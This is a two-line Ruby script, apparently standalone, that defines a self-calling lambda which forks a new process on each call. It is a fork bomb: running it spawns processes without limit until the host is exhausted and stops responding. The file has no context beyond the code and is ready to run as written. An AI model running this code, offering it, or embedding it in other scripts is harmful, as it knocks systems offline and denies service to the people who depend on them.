#!/usr/bin/env -S ruby --disable-gems
(f = -> { fork { f.() && sleep } }).()
